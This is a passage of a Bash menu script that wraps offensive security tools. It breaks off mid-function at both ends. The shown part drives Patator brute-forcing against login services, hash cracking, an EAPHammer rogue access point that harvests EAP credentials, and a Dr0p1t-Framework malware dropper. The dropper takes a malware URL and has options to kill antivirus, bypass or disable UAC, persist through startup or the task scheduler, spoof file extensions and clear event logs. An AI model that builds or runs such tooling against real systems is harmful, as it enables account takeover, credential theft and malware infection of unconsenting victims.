				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type the path of the next dictionary: "
				read DICTNEXT
				if [[ "$DICTNEXT" = "0" || "$DICTNEXT" = "o" || "$DICTNEXT" = "O" ]]
				then
					DICTTYPE=2
					break
				fi
			if [[ ! -f "$DICTNEXT" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
				DICTPATH=""$DICTPATH","$DICTNEXT""
			done
		elif [[ "$DICTSEL" = 3 ]]
		then
			echo -e "Type the path of the folder:"
			read DICTPATH
			if [[ ! -d "$DICTPATH" ]]
			then
				echo -e ""$RS"No such folder"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=3
		elif [[ "$DICTSEL" = "back" || "$DICTSEL" = "b" ]]
		then
			continue
		fi
	elif [[ "$DAGON" = 3 ]]
	then
		if [[ ! -f /root/lscript/hashlog.txt ]]
		then
			echo -e ""$RS"No log found."$CE""
			sleep 2
		else
			cat /root/lscript/hashlog.txt
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$DAGON" = 1 ]]
	then
		clear
		echo -e ""$YS" 1"$CE") Type a hash"
		echo -e ""$YS" 2"$CE") Type multiple hashes"
		echo -e ""$YS" 3"$CE") Select a file with hashes"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read HASHES
		clear
		if [[ "$HASHES" = "back" || "$HASHES" = "b" ]]
		then
			continue
		elif [[ "$HASHES" = 1 ]]
		then
			echo -e "Type your hash: "
			read HASH
			HASHTYPE=1
		elif [[ "$HASHES" = 2 ]]
		then
			echo -e "Type your first hash: "
			read HASH
			echo -e "$HASH" > $LPATH/hashes.txt
			while true
			do
				clear
				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type your next hash: "
				read HASH
				if [[ "$HASH" = "0" || "$HASH" = "o" || "$HASH" = "O" ]]
				then
					HASH="multiple"
					break
				fi
				echo -e "$HASH" >> $LPATH/hashes.txt
			done
			HASHTYPE=2
		elif [[ "$HASHES" = 3 ]]
		then
			echo -e "Type the full path of the file: "
			read HASHPATH
			if [[ ! -f "$HASHPATH" ]]
			then
				echo -e ""$RS"There is not such file."$CE""
				sleep 3
			else
				HASH="$HASHPATH"
			fi
			HASHTYPE=3
		fi
	elif [[ "$DAGON" = 00 ]]
	then
		exec bash $0
	elif [[ "$DAGON" = 0 ]]
	then
		clear
		exit
	elif [[ "$DAGON" = 2 ]]
	then
		if [[ "$CORV" = "crack" ]]
		then
			CORV="verify"
		else
			CORV="crack"
		fi
	fi
done
}
function patator_automation
{
while true
do
		clear
		echo -e ""$BS"Modes"$CE":"
	pttr=$(cat <<EOF
$YS  1$CE) ftp_login      : Brute-force FTP
$YS  2$CE) ssh_login      : Brute-force SSH
$YS  3$CE) telnet_login   : Brute-force Telnet
$YS  4$CE) smtp_login     : Brute-force SMTP
$YS  5$CE) smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
$YS  6$CE) smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
$YS  7$CE) finger_lookup  : Enumerate valid users using Finger
$YS  8$CE) http_fuzz      : Brute-force HTTP/HTTPS
$YS  9$CE) ajp_fuzz       : Brute-force AJP
$YS 10$CE) pop_login      : Brute-force POP
$YS 11$CE) pop_passd      : Brute-force poppassd (not POP3)
$YS 12$CE) imap_login     : Brute-force IMAP
$YS 13$CE) ldap_login     : Brute-force LDAP
$YS 14$CE) smb_login      : Brute-force SMB
$YS 15$CE) smb_lookupsid  : Brute-force SMB SID-lookup
$YS 16$CE) rlogin_login   : Brute-force rlogin
$YS 17$CE) vmauthd_login  : Brute-force VMware Authentication Daemon
$YS 18$CE) mssql_login    : Brute-force MSSQL
$YS 19$CE) oracle_login   : Brute-force Oracle
$YS 20$CE) mysql_login    : Brute-force MySQL
$YS 21$CE) mysql_query    : Brute-force MySQL queries
$YS 22$CE) rdp_login      : Brute-force RDP (NLA)
$YS 23$CE) pgsql_login    : Brute-force PostgreSQL
$YS 24$CE) vnc_login      : Brute-force VNC
$YS 25$CE) dns_forward    : Brute-force DNS
$YS 26$CE) dns_reverse    : Brute-force DNS (reverse lookup subnets)
$YS 27$CE) ike_enum       : Enumerate IKE transforms
$YS 28$CE) snmp_login     : Brute-force SNMPv1/2 and SNMPv3
$YS 29$CE) unzip_pass     : Brute-force the password of encrypted ZIP files
$YS 30$CE) keystore_pass  : Brute-force the password of Java keystore files
$YS 31$CE) sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
$YS 32$CE) umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
EOF
)
	echo -e "$pttr"
	echo -e "Choose: "
	read PT
	if [[ "$PT" = 1 ]]
	then
		XPT="ftp_login"
	elif [[ "$PT" = 2 ]]
	then
		XPT="ssh_login"
	elif [[ "$PT" = 3 ]]
	then
		XPT="telnet_login"
	elif [[ "$PT" = 4 ]]
	then
		XPT="smtp_login"
	elif [[ "$PT" = 5 ]]
	then
		XPT="smtp_vrfy"
	elif [[ "$PT" = 6 ]]
	then
		XPT="smtp_rcpt"
	elif [[ "$PT" = 7 ]]
	then
		XPT="finger_lookup"
	elif [[ "$PT" = 8 ]]
	then
		XPT="http_fuzz"
	elif [[ "$PT" = 9 ]]
	then
		XPT="ajp_fuzz"
	elif [[ "$PT" = 10 ]]
	then
		XPT="pop_login"
	elif [[ "$PT" = 11 ]]
	then
		XPT="pop_passd"
	elif [[ "$PT" = 12 ]]
	then
		XPT="imap_login"
	elif [[ "$PT" = 13 ]]
	then
		XPT="ldap_login"
	elif [[ "$PT" = 14 ]]
	then
		XPT="smb_login"
	elif [[ "$PT" = 15 ]]
	then
		XPT="smb_lookupsid"
	elif [[ "$PT" = 16 ]]
	then
		XPT="rlogin_login"
	elif [[ "$PT" = 17 ]]
	then
		XPT="vmauthd_login"
	elif [[ "$PT" = 18 ]]
	then
		XPT="mssql_login"
	elif [[ "$PT" = 19 ]]
	then
		XPT="oracle_login"
	elif [[ "$PT" = 20 ]]
	then
		XPT="mysql_login"
	elif [[ "$PT" = 21 ]]
	then
		XPT="mysql_query"
	elif [[ "$PT" = 22 ]]
	then
		XPT="rdp_login"
	elif [[ "$PT" = 23 ]]
	then
		XPT="pgsql_login"
	elif [[ "$PT" = 24 ]]
	then
		XPT="vnc_login"
	elif [[ "$PT" = 25 ]]
	then
		XPT="dns_forward"
	elif [[ "$PT" = 26 ]]
	then
		XPT="dns_reverse"
	elif [[ "$PT" = 27 ]]
	then
		XPT="ike_enum"
	elif [[ "$PT" = 28 ]]
	then
		XPT="snmp_login"
	elif [[ "$PT" = 29 ]]
	then
		XPT="unzip_pass"
	elif [[ "$PT" = 30 ]]
	then
		XPT="keystore_pass"
	elif [[ "$PT" = 31 ]]
	then
		XPT="sqlcipher_pass"
	elif [[ "$PT" = 32 ]]
	then
		XPT="umbraco_crack"
	fi
	if [[ "$XPT" = "" ]]
	then
		echo -e ""$RS"Wrong choice"$CE""
		sleep 3
		continue
	else
		cd /root/patator
		export XTP
		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
		xterm -T "PATATOR" -hold & disown
	fi
done
}
function eaphammer_automation
{
			while true
			do
				clear
				TERMINALTITLE="EAPHAMMER"
				dash_calc
				printf '\033]2;EAPHAMMER\a'
				if [[ "$EAPHIFACE" = "" ]]
				then
					EAPHIFACE="$WLANN"
				fi
				if [[ "$EAPHESSID" = "" ]]
				then
					EAPHESSID=""$RS"NONE"$CE""
					OK1=0
				elif [[ "$EAPHESSID" != "\e[1;31mNONE\e[0m" ]]
				then
					OK1=1
				fi
				if [[ "$EAPHBSSID" = "" ]]
				then
					EAPHBSSID=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCHANNEL" = "" ]]
				then
					EAPHCHANNEL=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHWPA" = "" ]]
				then
					EAPHWPA="2"
				fi
				if [[ "$EAPHAUTH" = "" ]]
				then
					EAPHAUTH=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCREDS" = "" ]]
				then
					EAPHCREDS="OFF"
				fi
				if [[ "$EAPHHOSTILE" = "" ]]
				then
					EAPHHOSTILE="OFF"
				fi
				if [[ "$EAPHCAPTIVE" = "" ]]
				then
					EAPHCAPTIVE="OFF"
				fi
				if [[ "$EAPHPIVOT" = "" ]]
				then
					EAPHPIVOT="OFF"
				fi
				if [[ "$EAPHKARMA" = "" ]]
				then
					EAPHKARMA="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "" ]]
				then
					EAPHAIRCRACK="OFF"
				fi
				if [[ "$EAPHINTAUTO" = "" ]]
				then
					EAPHINTAUTO="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "" ]]
				then
					EAPHWORD="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "OFF" ]]
				then
					EAPHWORD="OFF"
				fi
				OK2=1
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					if [[ "$EAPHWORD" = "OFF" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "ON" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
				then
					if [[ "$EAPHWORD" = "OFF" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "OFF" && "$EAPHAIRCRACK" = "OFF" ]]
				then
					if [[ "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					fi
				fi
				echo -e ""$YS" 1"$CE") Create a new RADIUS cert for your AP"
				echo -e ""$YS" 2"$CE") Set your interface for the AP               CURRENT: $EAPHIFACE"
				echo -e ""$YS" 3"$CE") Specify access point ESSID                  CURRENT: $EAPHESSID"
				echo -e ""$YS" 4"$CE") Specify access point BSSID                  CURRENT: $EAPHBSSID"
				echo -e ""$YS" 5"$CE") Specify access point channel                CURRENT: $EAPHCHANNEL"
				echo -e ""$YS" 6"$CE") Specify WPA type                            CURRENT: $EAPHWPA"
				echo -e ""$YS" 7"$CE") Specify auth type                           CURRENT: $EAPHAUTH"
				echo -e ""$YS" 8"$CE") Harvest EAP creds                           CURRENT: $EAPHCREDS"
				echo -e ""$YS" 9"$CE") Force clients to connect to hostile portal  CURRENT: $EAPHHOSTILE"
				echo -e ""$YS"10"$CE") Force clients to connect to captive portal  CURRENT: $EAPHCAPTIVE"
				echo -e ""$YS"11"$CE") Perform an indirect wireless pivot          CURRENT: $EAPHPIVOT"
				echo -e ""$YS"12"$CE") Enable karma                                CURRENT: $EAPHKARMA"
				echo -e ""$YS"13"$CE") Use autocrack/add with remote cracking rig  CURRENT: $EAPHAIRCRACK"
				echo -e ""$YS"14"$CE") Use internal autocrack                      CURRENT: $EAPHINTAUTO"
				echo -e ""$YS"15"$CE") Specify wordlist for autocrack              CURRENT: $EAPHWORD"
				echo -e ""$YS"start"$CE") Start "
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" back"$CE") Go back"
				echo -e "Choose: "
				read EAPH
				clear
				if [[ "$EAPH" = 1 ]]
				then
					cd /root/eaphammer
					./eaphammer --cert-wizard
				elif [[ "$EAPH" = 2 ]]
				then
					echo -e "Type the interface you want to use: "
					read EAPHIFACE
				elif [[ "$EAPH" = 3 ]]
				then
					echo -e "Type the ESSID: "
					read EAPHESSID
				elif [[ "$EAPH" = 4 ]]
				then
					echo -e "Type the BSSID: "
					read EAPHBSSID
				elif [[ "$EAPH" = 5 ]]
				then
					echo -e "Type the channel: "
					read EAPHCHANNEL
				elif [[ "$EAPH" = 6 ]]
				then
					if [[ "$EAPHWPA" = 1 ]]
					then
						EAPHWPA=2
					else
						EAPHWPA=1
					fi
				elif [[ "$EAPH" = 7 ]]
				then
					echo -e ""$YS" 1"$CE") Open"
					echo -e ""$YS" 2"$CE") ttls"
					echo -e ""$YS" 3"$CE") peap"
					echo -e "Choose: "
					read PAUTH
					if [[ "$PAUTH" = 1 ]]
					then
						EAPHAUTH="open"
					elif [[ "$PAUTH" = 2 ]]
					then
						EAPHAUTH="ttls"
					elif [[ "$PAUTH" = 3 ]]
					then
						EAPHAUTH="peap"
					fi
				elif [[ "$EAPH" = 8 ]]
				then
					if [[ "$EAPHCREDS" = "OFF" ]]
					then
						EAPHCREDS="ON"
					else
						EAPHCREDS="OFF"
					fi
				elif [[ "$EAPH" = 9 ]]
				then
					if [[ "$EAPHHOSTILE" = "OFF" ]]
					then
						EAPHHOSTILE="ON"
					else
						EAPHHOSTILE="OFF"
					fi
				elif [[ "$EAPH" = 10 ]]
				then
					if [[ "$EAPHCAPTIVE" = "OFF" ]]
					then
						EAPHCAPTIVE="ON"
					else
						EAPHCAPTIVE="OFF"
					fi
				elif [[ "$EAPH" = 11 ]]
				then
					if [[ "$EAPHPIVOT" = "OFF" ]]
					then
						EAPHPIVOT="ON"
					else
						EAPHPIVOT="OFF"
					fi
				elif [[ "$EAPH" = 12 ]]
				then
					if [[ "$EAPHKARMA" = "OFF" ]]
					then
						EAPHKARMA="ON"
					else
						EAPHKARMA="OFF"
					fi
				elif [[ "$EAPH" = 13 ]]
				then
					if [[ "$EAPHAIRCRACK" = "OFF" ]]
					then
						clear
						echo -e "Hostname: "
						read HOSTN
						echo -e "Port: "
						read PORT
						clear
						EAPHAIRCRACK=""$HOSTN":"$PORT""
					else
						EAPHAIRCRACK="OFF"
					fi
				elif [[ "$EAPH" = 14 ]]
				then
					if [[ "$EAPHINTAUTO" = "OFF" ]]
					then
						EAPHINTAUTO="ON"
					else
						EAPHINTAUTO="OFF"
					fi
				elif [[ "$EAPH" = 15 ]]
				then
					if [[ "$EAPHWORD" != "OFF" && "$EAPHWORD" != "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					else
						clear
						echo -e "Type the full wordlist path: "
						read EAPHWORD
					fi
				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
				then
					clear
					break
				elif [[ "$EAPH" = "00" ]]
				then
					clear
					exec bash $0
				elif [[ "$EAPH" = "0" ]]
				then
					clear
					exit
				elif [[ "$EAPH" = "start" ]]
				then
					clear
					if [[ "$OK1" != 1 ]]
					then
						echo -e "You haven't specified the important requirements"
						sleep 4
						continue
					fi
					if [[ "$OK2" != 1 ]]
					then
						echo -e "You haven't specified a wordlist for the autocrack"
						sleep 4
						continue
					fi
				if [[ "$EAPHCREDS" = "ON" ]]
				then
					CREDS="--creds"
				else
					CREDS=""
				fi
				if [[ "$EAPHHOSTILE" = "ON" ]]
				then
					HOSTILE="--hostile-portal"
				else
					HOSTILE=""
				fi
				if [[ "$EAPHCAPTIVE" = "ON" ]]
				then
					CAPTIVE="--captive-portal"
				else
					CAPTIVE=""
				fi
				if [[ "$EAPHPIVOT" = "ON" ]]
				then
					PIVOT="--pivot"
				else
					PIVOT=""
				fi
				if [[ "$EAPHKARMA" = "ON" ]]
				then
					KARMA="--karma"
				else
					KARMA=""
				fi
				if [[ "$EAPHINTAUTO" = "ON" ]]
				then
					INTAUTO="--local-autocrack"
				else
					INTAUTO=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					AIRCRACK="--remote-autocrack $EAPHAIRCRACK"
				else
					AIRCRACK=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" || "$EAPHINTAUTO" != "OFF" ]]
				then
					WORD="--wordlist $EAPHWORD"
				else
					WORD=""
				fi
				IFACE="-i $EAPHIFACE"
				CHANNEL="-c $EAPHCHANNEL"
				ESSID="-e $EAPHESSID"
				BSSID="-b $EAPHBSSID"
				WPA="--wpa $EAPHWPA"
				AUTH="--auth $EAPHAUTH"
					cd /root/eaphammer
					./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD
					
				fi
			done
}
function dropit_automation
{
clear
while true
do
	clear
	TERMINALTITLE="Dr0p1t-Framework"
	dash_calc
	printf '\033]2;Dr0p1t-Framework\a'
	if [[ "$MALURL" = "" ]]
	then
		MALURL="\e[1;31mNONE\e[0m"
	fi
	if [[ "$STARTUP" = "" ]]
	then
		STARTUP="OFF"
	fi
	if [[ "$TASK" = "" ]]
	then
		TASK="OFF"
	fi
	if [[ "$LTPUP" = "" ]]
	then
		LTPUP="OFF"
	fi
	if [[ "$KILLANT" = "" ]]
	then
		KILLANT="OFF"
	fi
	if [[ "$RUNBAT" = "" ]]
	then
		RUNBAT="OFF"
	fi
	if [[ "$RUNPOW" = "" ]]
	then
		RUNPOW="OFF"
	fi
	if [[ "$RUNVBS" = "" ]]
	then
		RUNVBS="OFF"
	fi
	if [[ "$UACASADMIN" = "" ]]
	then
		UACASADMIN="OFF"
	fi
	if [[ "$SPOOFEXT" = "" ]]
	then
		SPOOFEXT="OFF"
	fi
	if [[ "$ISZIP" = "" ]]
	then
		ISZIP="OFF"
	fi
	if [[ "$COMPRESS" = "" ]]
	then
		COMPRESS="OFF"
	fi
	if [[ "$DISUAC" = "" ]]
	then
		DISUAC="OFF"
	fi
	if [[ "$ICON" = "" ]]
	then
		ICON="OFF"
	fi
	if [[ "$EVENT" = "" ]]
	then
		EVENT="OFF"
	fi
	if [[ "$COMPILE" = "" ]]
	then
		COMPILE="OFF"
	fi
	if [[ "$D32" = "" ]]
	then
		D32="OFF"
	fi
	if [[ "$D64" = "" ]]
	then
		D64="OFF"
	fi
	if [[ "$BANN" = "" ]]
	then
		BANN="OFF"
	fi
	echo -e ""$YS" 1"$CE") Malware URL                          CURRENT:$MALURL"
	echo -e ""$YS" 2"$CE") Malware to startup                   CURRENT:$STARTUP"
	echo -e ""$YS" 3"$CE") Malware to task scheduler            CURRENT:$TASK"
	echo -e ""$YS" 4"$CE") Add link to powershell user profile  CURRENT:$LTPUP"
	echo -e ""$YS" 5"$CE") Kill antivirus before malware        CURRENT:$KILLANT"
	echo -e ""$YS" 6"$CE") Run batch script before malware      CURRENT:$RUNBAT"
	echo -e ""$YS" 7"$CE") Run powershell script before malware CURRENT:$RUNPOW"
	echo -e ""$YS" 8"$CE") Run vbs script before malware        CURRENT:$RUNVBS"
	echo -e ""$YS" 9"$CE") Bypass UAC and run malware as admin  CURRENT:$UACASADMIN"
	echo -e ""$YS"10"$CE") Spoof final file to an extension     CURRENT:$SPOOFEXT"
	echo -e ""$YS"11"$CE") Malware is zip compressed            CURRENT:$ISZIP"
	echo -e ""$YS"12"$CE") Compress the final file with UPX     CURRENT:$COMPRESS"
	echo -e ""$YS"13"$CE") Try to disable UAC on victim device  CURRENT:$DISUAC"
	echo -e ""$YS"14"$CE") Use icon to the final file           CURRENT:$ICON"
	echo -e ""$YS"15"$CE") Don't clean target's event log       CURRENT:$EVENT"
	echo -e ""$YS"16"$CE") Don't compile the final file         CURRENT:$COMPILE"
	echo -e ""$YS"17"$CE") Download malware for 32 bit only     CURRENT:$D32"
	echo -e ""$YS"18"$CE") Download malware for 64 bit only     CURRENT:$D64"
	echo -e ""$YS"19"$CE") Stay quite(no banner)                CURRENT:$BANN"
	echo -e ""$YS" o"$CE") Open output folder"
	echo -e ""$YS" u"$CE") Check for updates"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"start"$CE") Generate"
	echo -e "Choose: "
	read DR
	clear
	if [[ "$DR" = "o" ]]
	then
		gio open /root/Dr0p1t-Framework/output
		continue
	fi
	if [[ "$DR" = "u" ]]
	then
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py -u
		cd
		continue
	fi
	if [[ "$DR" = "start" ]]
	then
		if [[ "$MALURL" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No URL specified."$CE""
			sleep 2
			continue
		fi
		if [[ "$STARTUP" = "OFF" ]]
		then
			DSTARTUP=""
		else
			DSTARTUP="-s"
		fi
		if [[ "$TASK" = "OFF" ]]
		then
			DTASK=""
		else
			DTASK="-t"
		fi
		if [[ "$LTPUP" = "OFF" ]]
		then
			DLTPUP=""
		else
			DLTPUP="-a"
		fi
		if [[ "$KILLANT" = "OFF" ]]
		then
			DKILLANT=""
		else
			DKILLANT="-k"
		fi
		if [[ "$RUNBAT" = "OFF" ]]
		then
			DRUNBAT=""
		else
			DRUNBAT="-b $RUNBAT"
		fi
		if [[ "$RUNPOW" = "OFF" ]]
		then
			DRUNPOW=""
		else
			DRUNPOW="-p $RUNPOW"
		fi
		if [[ "$RUNVBS" = "OFF" ]]
		then
			DRUNVBS=""
		else
			DRUNVBS="-v $RUNVBS"
		fi
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			DUACASADMIN=""
		else
			DUACASADMIN="--runas"
		fi
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			DSPOOFEXT=""
		else
			DSPOOFEXT="--spoof $SPOOFEXT"
		fi
		if [[ "$ISZIP" = "OFF" ]]
		then
			DISZIP=""
		else
			DISZIP="--zip"
		fi
		if [[ "$COMPRESS" = "OFF" ]]
		then
			DCOMPRESS=""
		else
			DCOMPRESS="--upx"
		fi
		if [[ "$DISUAC" = "OFF" ]]
		then
			DDISUAC=""
		else
			DDISIAC="--nouac"
		fi
		if [[ "$ICON" = "OFF" ]]
		then
			DICON=""
		else
			DICON="-i $ICON"
		fi
		if [[ "$EVENT" = "OFF" ]]
		then
			DEVENT=""
		else
			DEVENT="--noclearevent"
		fi
		if [[ "$COMPILE" = "OFF" ]]
		then
			DCOMPILE=""
		else
			DCOMPILE="--nocompile"
		fi
		if [[ "$D32" = "OFF" ]]
		then
			DD32=""
		else
			DD32="--only32"
		fi
		if [[ "$D64" = "OFF" ]]
		then
			DD64=""
		else
			DD64="--only64"
		fi
		if [[ "$BANN" = "OFF" ]]
		then
			DBANN=""
		else
			DBANN="-q"
		fi
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
		echo -e "$PAKTGB"
		$READAK
		cd
	elif [[ "$DR" = 1 ]]
	then
		echo -e "Malware URL: "
		read MALURL
	elif [[ "$DR" = 14 ]]
	then
		if [[ "$ICON" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Icon must be on /root/Dr0p1t-Framework/icons folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/icons/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my icon to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your icon: "
				read ICON
				if [[ "$ICON" = "b" ]]
				then
					ICON="OFF"
					break
				elif [[ "$ICON" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/icons/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON".ico ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						ICON=""$ICON".ico"
						break
					fi
				else
					break
				fi
			done
		else
			ICON="OFF"
		fi
	elif [[ "$DR" = 8 ]]
	then
		if [[ "$RUNVBS" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/vbs folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/vbs/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNVBS
				if [[ "$RUNVBS" = "b" ]]
				then
					RUNVBS="OFF"
					break
				elif [[ "$RUNVBS" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/vbs/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNVBS=""$RUNVBS".vbs"
						break
					fi
				else
					break
				fi
			done
		else
			RUNVBS="OFF"
		fi
	elif [[ "$DR" = 7 ]]
	then
		if [[ "$RUNPOW" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/powershell folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/powershell/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNPOW
				if [[ "$RUNPOW" = "b" ]]
				then
					RUNPOW="OFF"
					break
				elif [[ "$RUNPOW" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/powershell/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNPOW=""$RUNPOW".ps1"
						break
					fi
				else
					break
				fi
			done
		else
			RUNPOW="OFF"
		fi
	elif [[ "$DR" = 6 ]]
	then
		if [[ "$RUNBAT" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/bat folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/bat/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNBAT
				if [[ "$RUNBAT" = "b" ]]
				then
					RUNBAT="OFF"
					break
				elif [[ "$RUNBAT" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/bat/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNBAT=""$RUNBAT".bat"
						break
					fi
				else
					break
				fi
			done
		else
			RUNBAT="OFF"
		fi
	elif [[ "$DR" = 2 ]]
	then
		if [[ "$STARTUP" = "OFF" ]]
		then
			STARTUP="ON"
		else
			STARTUP="OFF"
		fi
	elif [[ "$DR" = 3 ]]
	then
		if [[ "$TASK" = "OFF" ]]
		then
			TASK="ON"
		else
			TASK="OFF"
		fi
	elif [[ "$DR" = 4 ]]
	then
		if [[ "$LTPUP" = "OFF" ]]
		then
			LTPUP="ON"
		else
			LTPUP="OFF"
		fi
	elif [[ "$DR" = 5 ]]
	then
		if [[ "$KILLANT" = "OFF" ]]
		then
			KILLANT="ON"
		else
			KILLANT="OFF"
		fi
	elif [[ "$DR" = 9 ]]
	then
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			UACASADMIN="ON"
		else
			UACASADMIN="OFF"
		fi
	elif [[ "$DR" = 10 ]]
	then
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			echo -e "Extension: "
			read SPOOFEXT
		else
			SPOOFEXT="OFF"
		fi
	elif [[ "$DR" = 11 ]]
	then
		if [[ "$ISZIP" = "OFF" ]]
		then
			ISZIP="ON"
		else
			ISZIP="OFF"
		fi
	elif [[ "$DR" = 12 ]]
	then
		if [[ "$COMPRESS" = "OFF" ]]
		then
			COMPRESS="ON"
		else
			COMPRESS="OFF"
		fi
	elif [[ "$DR" = 13 ]]
	then
		if [[ "$DISUAC" = "OFF" ]]
		then
			DISUAC="ON"
		else
			DISUAC="OFF"
		fi
	elif [[ "$DR" = 15 ]]
	then
		if [[ "$EVENT" = "OFF" ]]
		then
			EVENT="ON"
		else
			EVENT="OFF"
		fi
	elif [[ "$DR" = 16 ]]
	then
		if [[ "$COMPILE" = "OFF" ]]
		then
			COMPILE="ON"
		else
			COMPILE="OFF"
		fi
	elif [[ "$DR" = 17 ]]
	then
		if [[ "$D32" = "OFF" ]]
		then
			D32="ON"
		else
			D32="OFF"
		fi
	elif [[ "$DR" = 18 ]]
	then
		if [[ "$D64" = "OFF" ]]
		then
			D64="ON"
		else
			D64="OFF"
		fi
	elif [[ "$DR" = 19 ]]
	then
		if [[ "$BANN" = "OFF" ]]
		then
			BANN="ON"
		else
			BANN="OFF"
		fi
	fi
done
}
function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	TERMINALTITLE="WIFI TOOLS"
	dash_calc
	if [[ -d /root/fluxion ]]
	then
		echo -e ""$YS" 1"$CE") Fluxion               The future of MITM WPA attacks"
	else
		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"               The future of MITM WPA attacks"
	fi
	if [[ -f /usr/bin/wifite ]]
